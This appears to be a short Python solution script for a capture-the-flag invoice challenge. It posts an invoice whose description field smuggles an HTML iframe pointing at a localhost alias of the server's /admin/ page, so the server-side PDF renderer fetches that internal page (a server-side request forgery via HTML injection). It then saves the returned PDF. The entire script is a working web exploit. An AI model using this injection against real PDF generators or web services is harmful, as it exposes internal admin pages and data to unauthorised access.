import requests

URL = "http://invoice.deadface.io:3000"

description = """
<iframe width=600 height=600 src='http://foo.localtest.me:3000/admin/'> </iframe>
"""

req = requests.post(f"{URL}/invoice", data={
    "name": ...,
    "amount": ...,
    "description": description,
})

with open('tmp.pdf', 'wb') as f:
    f.write(req.content)